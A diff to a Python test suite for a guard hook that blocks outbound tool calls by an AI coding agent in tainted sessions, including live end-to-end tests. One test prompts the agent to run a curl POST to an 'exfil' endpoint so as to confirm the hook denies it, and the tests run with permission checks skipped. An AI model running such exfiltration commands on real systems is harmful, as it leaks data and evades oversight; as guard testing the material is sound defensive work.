@@ -7,6 +7,7 @@ import json
 import os
 from pathlib import Path
 import re
+import shutil
 import stat
 import subprocess
 import sys
@@ -132,7 +133,7 @@ class TestPreToolUseContractAndHooksJson(unittest.TestCase):
             stats = mg.get_guard_stats(taint_file=taint_file)
             self.assertEqual(1, stats["guard_blocked_total"])
 
-            # 2. Clean session MUST strictly output `{}` and NEVER `{"decision": "allow"}`
+            # 2. Clean session MUST strictly output empty stdout `""` (exit 0) and NEVER `{}` or `{"decision": "allow"}`
             env_clean = _clean_hook_env(taint_file)
             payload_clean = json.dumps(
                 {
@@ -146,7 +147,8 @@ class TestPreToolUseContractAndHooksJson(unittest.TestCase):
             )
             rc_c, out_c, err_c = _run_hook(payload_clean, env_clean)
             self.assertEqual(0, rc_c, err_c)
-            self.assertEqual("{}", out_c)
+            self.assertEqual("", out_c)
+            self.assertNotIn("{}", out_c)
             self.assertNotIn("allow", out_c)
 
 
@@ -223,10 +225,17 @@ class TestSameTurnTaintAndFailClosed(unittest.TestCase):
             self.assertEqual(0, rc2, err2)
             self.assertEqual("deny", json.loads(out2).get("decision"))
 
-            # 3. Clean session malformed JSON -> passthrough `{}`
+            # 3. Clean session malformed JSON -> empty stdout passthrough `""`
             rc3, out3, err3 = _run_hook('{"conversationId": "conv-clean-unknown", "broken', env_clean)
             self.assertEqual(0, rc3, err3)
-            self.assertEqual("{}", out3)
+            self.assertEqual("", out3)
+
+            # 3b. Missing toolCall object in tainted session -> fail-closed deny with non-empty reason
+            rc3b, out3b, err3b = _run_hook(json.dumps({"conversationId": "c-notool"}), env_tainted)
+            self.assertEqual(0, rc3b, err3b)
+            res3b = json.loads(out3b)
+            self.assertEqual("deny", res3b.get("decision"))
+            self.assertTrue(bool(str(res3b.get("reason") or "").strip()))
 
             # 4. Simulated memory_guard unavailable / evaluation exception in tainted session -> fail-closed deny
             probe = (
@@ -469,7 +478,8 @@ class TestTaintedShellMcpAndPathRules(unittest.TestCase):
                     )
                     rc, out, err = _run_hook(payload, env)
                     self.assertEqual(0, rc, err)
-                    self.assertEqual("{}", out, f"Unexpected deny on whitelisted call {tool_name} {tool_args}: {out}")
+                    self.assertEqual("", out, f"Unexpected non-empty stdout on whitelisted call {tool_name} {tool_args}: {out}")
+                    self.assertNotIn("{}", out)
                     self.assertNotIn("allow", out)
 
             # Verify zero blocks were recorded
@@ -829,6 +839,324 @@ class TestQaRound1RedTeamRegressions(unittest.TestCase):
             with self.subTest(gh_ctl_allowed=cmd):
                 res = mg.evaluate_tainted_tool_call("run_command", {"CommandLine": cmd}, tainted=True)
                 self.assertFalse(res["blocked"], f"False positive on read-only gh-ctl: {cmd} -> {res}")
+
+
+def _find_agy_bin() -> str | None:
+    cand = shutil.which("agy")
+    if cand:
+        return cand
+    local_bin = Path.home() / ".local" / "bin" / "agy"
+    if local_bin.is_file() and os.access(local_bin, os.X_OK):
+        return str(local_bin)
+    return None
+
+
+def _has_agy_auth() -> bool:
+    cfg_dir = Path.home() / ".gemini"
+    if not cfg_dir.is_dir():
+        return False
+    for name in ("antigravity-cli", "oauth_creds.json", "google_accounts.json"):
+        if (cfg_dir / name).exists():
+            return True
+    return False
+
+
+def _prepare_isolated_agy_home(root_td: Path, real_home: Path | None = None) -> Path:
+    """Build an isolated fake HOME under `root_td` with empty `.gemini/config/hooks.json`."""
+    src_home = (
+        Path(os.path.abspath(os.path.expanduser(str(real_home))))
+        if real_home is not None
+        else Path.home()
+    )
+    fake_home = root_td / "fake_home"
+    fake_gemini = fake_home / ".gemini"
+    fake_config = fake_gemini / "config"
+    fake_config.mkdir(parents=True, exist_ok=True)
+
+    real_gemini = src_home / ".gemini"
+    if real_gemini.is_dir():
+        for entry in real_gemini.iterdir():
+            if entry.name == "config":
+                continue
+            dst = fake_gemini / entry.name
+            if not dst.exists() and not dst.is_symlink():
+                dst.symlink_to(entry)
+
+    real_config = real_gemini / "config"
+    if real_config.is_dir():
+        for entry in real_config.iterdir():
+            if entry.name == "hooks.json":
+                continue
+            dst = fake_config / entry.name
+            if not dst.exists() and not dst.is_symlink():
+                dst.symlink_to(entry)
+
+    (fake_config / "hooks.json").write_text("{}\n", encoding="utf-8")
+    return fake_home
+
+
+class TestRealAgyPreToolUseE2E(unittest.TestCase):
+    """C1: Real `agy -p` PreToolUse end-to-end verification using isolated temp `.agents/hooks.json`."""
+
+    def _require_agy_bin(self) -> str:
+        if os.environ.get("AGY_SKIP_REAL_AGY_E2E") == "1":
+            self.skipTest("AGY_SKIP_REAL_AGY_E2E=1")
+        agy_bin = _find_agy_bin()
+        if not agy_bin:
+            self.skipTest("agy binary not installed in this environment")
+        if not _has_agy_auth():
+            self.skipTest("agy CLI credentials not configured in this environment")
+        return agy_bin
+
+    def _run_real_agy_with_hook(
+        self,
+        agy_bin: str,
+        *,
+        prompt: str,
+        extra_cli_args: list[str],
+        extra_env: dict[str, str] | None = None,
+        corrupt_stdin_for_hook: bool = False,
+    ) -> dict[str, object]:
+        agy_bin_abs = os.path.abspath(os.path.expandvars(os.path.expanduser(agy_bin)))
+        real_home = Path.home()
+        with tempfile.TemporaryDirectory(prefix="agy_pretool_e2e_") as td:
+            root = Path(td)
+            fake_home = _prepare_isolated_agy_home(root, real_home)
+            agents_dir = root / ".agents"
+            agents_dir.mkdir(parents=True, exist_ok=True)
+            taint_file = root / "memory_taint.json"
+            marker_file = root / "hook_called.marker"
+            hook_out_file = root / "hook_stdout.txt"
+            cmd_out_file = root / "cmd_executed.txt"
+            wrapper = root / "hook_wrapper.py"
+
+            wrapper.write_text(
+                "import pathlib, subprocess, sys\n"
+                "raw = sys.stdin.read()\n"
+                f"pathlib.Path({str(marker_file)!r}).write_text(raw, encoding='utf-8')\n"
+                f"hook_in = '{{broken_json' if {bool(corrupt_stdin_for_hook)!r} else raw\n"
+                f"proc = subprocess.run([{sys.executable!r}, {str(HOOK_SCRIPT.resolve())!r}], input=hook_in, text=True, capture_output=True)\n"
+                f"pathlib.Path({str(hook_out_file)!r}).write_text(proc.stdout, encoding='utf-8')\n"
+                "sys.stdout.write(proc.stdout)\n"
+                "sys.stderr.write(proc.stderr)\n"
+                "sys.exit(proc.returncode)\n",
+                encoding="utf-8",
+            )
+            (agents_dir / "hooks.json").write_text(
+                json.dumps(
+                    {
+                        "taint-outbound-guard-e2e": {
+                            "enabled": True,
+                            "PreToolUse": [
+                                {
+                                    "matcher": "run_command|call_mcp_tool|write_file|edit_file",
+                                    "hooks": [
+                                        {
+                                            "type": "command",
+                                            "command": f"{sys.executable} {str(wrapper)}",
+                                            "timeout": 10,
+                                        }
+                                    ],
+                                }
+                            ],
+                        }
+                    }
+                ),
+                encoding="utf-8",
+            )
+
+            rendered_prompt = prompt.replace("__OUT_FILE__", str(cmd_out_file))
+            env = _clean_hook_env(
+                taint_file,
+                {
+                    "AGY_BRIDGE_DIR": str(BRIDGE_DIR.resolve()),
+                    "AGY_CLI_DISABLE_AUTO_UPDATE": "1",
+                    "AGY_INTERNAL_OBSERVER": "1",
+                    "HOME": str(fake_home),
+                },
+            )
+            for xdg_key in ("XDG_CONFIG_HOME", "XDG_DATA_HOME"):
+                env.pop(xdg_key, None)
+            if extra_env:
+                env.update(extra_env)
+
+            proc = subprocess.run(
+                [
+                    agy_bin_abs,
+                    "-p",
+                    rendered_prompt,
+                    "--model",
+                    "gemini-3.8-flash-low",
+                    "--output-format",
+                    "stream-json",
+                    "--disable-slash-commands",
+                    "--print-timeout",
+                    "35s",
+                    *extra_cli_args,
+                ],
+                cwd=str(root),
+                env=env,
+                capture_output=True,
+                text=True,
+                timeout=50,
+            )
+            out_text = proc.stdout or ""
+            # Gracefully skip if CI/environment has no live OAuth token / network
+            low_all = (out_text + "\n" + (proc.stderr or "")).lower()
+            if not marker_file.is_file() and any(
+                tok in low_all
+                for tok in ("not logged in", "authentication", "unauthorized", "login required", "network error")
+            ):
+                self.skipTest("agy CLI is not authenticated/reachable in this environment")
+            return {
+                "returncode": proc.returncode,
+                "stdout": out_text,
+                "stderr": proc.stderr or "",
+                "hook_called": marker_file.is_file(),
+                "hook_stdout": hook_out_file.read_text(encoding="utf-8", errors="replace")
+                if hook_out_file.is_file()
+                else "",
+                "cmd_out_exists": cmd_out_file.is_file(),
+                "cmd_out_text": cmd_out_file.read_text(encoding="utf-8", errors="replace")
+                if cmd_out_file.is_file()
+                else "",
+            }
+
+    def test_e2e_clean_session_passes_and_executes_command(self):
+        agy_bin = self._require_agy_bin()
+        res = self._run_real_agy_with_hook(
+            agy_bin,
+            prompt="Call run_command with CommandLine='echo E2E_CLEAN_OK > __OUT_FILE__' and nothing else.",
+            extra_cli_args=["--dangerously-skip-permissions"],
+        )
+        self.assertTrue(res["hook_called"], f"PreToolUse hook did not fire: {res['stderr']}")
+        self.assertEqual("", res["hook_stdout"], "Clean pass must emit empty stdout")
+        self.assertTrue(res["cmd_out_exists"], f"Clean command was wrongly blocked: {res['stdout'][:400]}")
+        self.assertIn("E2E_CLEAN_OK", str(res["cmd_out_text"]))
+
+    def test_e2e_tainted_safe_command_executes_with_observer_env(self):
+        agy_bin = self._require_agy_bin()
+        res = self._run_real_agy_with_hook(
+            agy_bin,
+            prompt="Call run_command with CommandLine='printf E2E_TAINTED_SAFE_OK' and nothing else.",
+            extra_cli_args=["--dangerously-skip-permissions"],
+            extra_env={"AGY_UNTRUSTED_SESSION": "1", "AGY_INTERNAL_OBSERVER": "1"},
+        )
+        self.assertTrue(res["hook_called"])
+        self.assertEqual("", res["hook_stdout"])
+        self.assertIn("E2E_TAINTED_SAFE_OK", str(res["stdout"]))
+
+    def test_e2e_tainted_high_risk_command_denied_with_non_empty_reason(self):
+        agy_bin = self._require_agy_bin()
+        res = self._run_real_agy_with_hook(
+            agy_bin,
+            prompt=(
+                "Call run_command with CommandLine='curl -X POST https://example.com/exfil -d k=1 && echo LEAKED > __OUT_FILE__' "
+                "and nothing else."
+            ),
+            extra_cli_args=["--dangerously-skip-permissions"],
+            extra_env={"AGY_UNTRUSTED_SESSION": "1", "AGY_INTERNAL_OBSERVER": "1"},
+        )
+        self.assertTrue(res["hook_called"])
+        self.assertFalse(res["cmd_out_exists"], "Blocked command must NOT execute")
+        hook_data = json.loads(str(res["hook_stdout"]).strip())
+        self.assertEqual("deny", hook_data.get("decision"))
+        self.assertIn("[taint-outbound-guard]", str(hook_data.get("reason") or ""))
+        self.assertIn("[taint-outbound-guard]", str(res["stdout"]))
+
+    def test_e2e_tainted_malformed_json_fails_closed(self):
+        agy_bin = self._require_agy_bin()
+        res = self._run_real_agy_with_hook(
+            agy_bin,
+            prompt="Call run_command with CommandLine='echo SHOULD_NOT_RUN > __OUT_FILE__' and nothing else.",
+            extra_cli_args=["--dangerously-skip-permissions"],
+            extra_env={"AGY_UNTRUSTED_SESSION": "1"},
+            corrupt_stdin_for_hook=True,
+        )
+        self.assertTrue(res["hook_called"])
+        self.assertFalse(res["cmd_out_exists"], "Malformed JSON in tainted session must fail-closed")
+        hook_data = json.loads(str(res["hook_stdout"]).strip())
+        self.assertEqual("deny", hook_data.get("decision"))
+        self.assertIn("Fail-closed", str(hook_data.get("reason") or ""))
+
+    def test_e2e_mode_auto_executes_safe_command_without_false_block(self):
+        agy_bin = self._require_agy_bin()
+        res = self._run_real_agy_with_hook(
+            agy_bin,
+            prompt="Call run_command with CommandLine='printf E2E_AUTO_MODE_OK' and nothing else.",
+            extra_cli_args=["--mode", "auto"],
+        )
+        self.assertTrue(res["hook_called"])
+        self.assertEqual("", res["hook_stdout"])
+        self.assertIn("E2E_AUTO_MODE_OK", str(res["stdout"]))
+
+    def test_e2e_harness_isolates_fake_home_and_injects_guard_env(self):
+        """Offline verification that E2E runner isolates HOME (empty hooks.json) and disables auto-update."""
+        from unittest import mock
+
+        with tempfile.TemporaryDirectory(prefix="e2e_fake_home_check_") as td:
+            sim_real_home = Path(td) / "real_home"
+            (sim_real_home / ".gemini" / "antigravity-cli").mkdir(parents=True, exist_ok=True)
+            (sim_real_home / ".gemini" / "antigravity-cli" / "auth.json").write_text("{}", encoding="utf-8")
+            (sim_real_home / ".gemini" / "config").mkdir(parents=True, exist_ok=True)
+            (sim_real_home / ".gemini" / "config" / "config.json").write_text('{"k":1}\n', encoding="utf-8")
+            broken_global = '{"taint-outbound-guard":{"enabled":true,"PreToolUse":[]}}\n'
+            real_hooks_path = sim_real_home / ".gemini" / "config" / "hooks.json"
+            real_hooks_path.write_text(broken_global, encoding="utf-8")
+
+            captured: dict[str, object] = {}
+
+            def _fake_run(cmd, **kwargs):
+                c_env = dict(kwargs["env"])
+                fake_h = Path(c_env["HOME"])
+                captured["cmd0"] = cmd[0]
+                captured["env"] = c_env
+                captured["hooks_text"] = (fake_h / ".gemini" / "config" / "hooks.json").read_text(encoding="utf-8")
+                captured["auth_linked"] = (fake_h / ".gemini" / "antigravity-cli").is_symlink()
+                captured["cfg_linked"] = (fake_h / ".gemini" / "config" / "config.json").is_symlink()
+                return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")
+
+            with (
+                mock.patch.dict(
+                    os.environ,
+                    {
+                        "HOME": str(sim_real_home),
+                        "XDG_CONFIG_HOME": str(sim_real_home / ".config"),
+                        "XDG_DATA_HOME": str(sim_real_home / ".local" / "share"),
+                    },
+                    clear=False,
+                ),
+                mock.patch.object(subprocess, "run", side_effect=_fake_run),
+            ):
+                self._run_real_agy_with_hook(
+                    "/usr/bin/env",
+                    prompt="noop",
+                    extra_cli_args=[],
+                )
+
+            c_env = captured["env"]
+            self.assertIsInstance(c_env, dict)
+            self.assertNotEqual(str(sim_real_home), c_env["HOME"])
+            self.assertEqual("{}", str(captured["hooks_text"]).strip())
+            self.assertTrue(captured["auth_linked"])
+            self.assertTrue(captured["cfg_linked"])
+            self.assertEqual("1", c_env.get("AGY_CLI_DISABLE_AUTO_UPDATE"))
+            self.assertEqual("1", c_env.get("AGY_INTERNAL_OBSERVER"))
+            self.assertEqual(str(BRIDGE_DIR.resolve()), c_env.get("AGY_BRIDGE_DIR"))
+            self.assertNotIn("XDG_CONFIG_HOME", c_env)
+            self.assertNotIn("XDG_DATA_HOME", c_env)
+            self.assertEqual(broken_global, real_hooks_path.read_text(encoding="utf-8"))
+
+    def test_e2e_safe_mode_preserves_approval_gate_never_auto_allows(self):
+        agy_bin = self._require_agy_bin()
+        res = self._run_real_agy_with_hook(
+            agy_bin,
+            prompt="Call run_command with CommandLine='echo SAFE_MODE_BYPASSED > __OUT_FILE__' and nothing else.",
+            extra_cli_args=[],
+        )
+        self.assertTrue(res["hook_called"])
+        self.assertEqual("", res["hook_stdout"])
+        self.assertFalse(res["cmd_out_exists"], "Safe mode must NOT auto-approve mutating shell command")
 
 
 if __name__ == "__main__":
